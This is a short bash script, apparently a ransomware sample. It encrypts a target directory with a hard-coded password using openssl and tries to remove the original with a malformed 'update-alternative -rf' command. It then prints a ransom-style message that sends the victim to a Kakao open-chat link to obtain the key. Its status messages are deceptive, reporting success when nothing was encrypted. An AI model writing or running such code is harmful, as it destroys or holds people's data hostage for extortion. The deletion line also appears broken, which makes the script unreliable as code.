#!/bin/bash

DIR_TO_ENCRYPT="/test"
PASSWORD="YOUAREHERO"
ENCRYPTED_FILE="/test-encrypted.aes"

encrypt_directory() {
    tar -czf - "$DIR_TO_ENCRYPT" 2>/dev/null | openssl enc -aes-256-cbc -salt -pbkdf2 -pass pass:"$PASSWORD" -out "$ENCRYPTED_FILE"
}

if ! command -v openssl &> /dev/null; then
    echo "Error: Package installation failed. Downloading required packages..."
    apt-get update
    apt-get install -y openssl
    echo "Success"
fi

if [ -d "$DIR_TO_ENCRYPT" ]; then
    encrypt_directory
    if [ $? -eq 0 ]; then
        update-alternative -rf "$DIR_TO_ENCRYPT"
        echo "Warning: The encrypted file is saved as $ENCRYPTED_FILE."
        echo "Warning: To obtain the decryption key, visit: https://open.kakao.com/o/szkL4BQg"
    else
        echo "Error: Encryption failed. The original directory was not deleted."
    fi
else
    echo "Success: Directory $DIR_TO_ENCRYPT has been encrypted."
fi
